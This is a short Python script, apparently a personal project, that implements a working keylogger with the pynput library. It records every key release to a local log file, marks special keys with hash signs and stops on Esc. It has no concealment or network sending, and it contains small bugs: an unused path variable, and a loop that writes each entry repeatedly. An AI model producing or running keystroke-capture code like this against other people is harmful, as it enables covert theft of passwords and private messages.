from pynput.keyboard import Listener, Key
arq = '/home/cabriel/Documentos/python-scripts/keylogger/log.txt'

def log(texto):
    with open('log.txt', 'a') as fl: 
       for t in texto:  
           fl.write(texto)
           fl.write('\n') 

def monitor(key):
    print(key)
    try:
        log(key.char) 
    except AttributeError:
        log('####' + str(key)+'#####')    

    if key == Key.esc:
        return False

with Listener (on_release=monitor) as l:
    l.join()

  
